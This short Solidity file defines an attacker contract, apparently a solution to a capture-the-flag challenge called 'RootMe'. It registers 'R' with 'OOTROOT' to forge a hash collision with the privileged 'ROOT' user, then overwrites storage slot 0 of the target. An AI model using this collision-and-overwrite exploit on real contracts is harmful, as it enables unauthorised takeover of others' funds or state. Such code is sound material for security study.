// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IRootMe {
    function register(string memory, string memory) external;

    function write(bytes32, bytes32) external;
}

contract RootMeAttacker {
    constructor(address _address) {
        IRootMe rootMe = IRootMe(_address);
        rootMe.register("R", "OOTROOT");
        rootMe.write(bytes32(uint256(0)), bytes32(uint256(1)));
    }
}
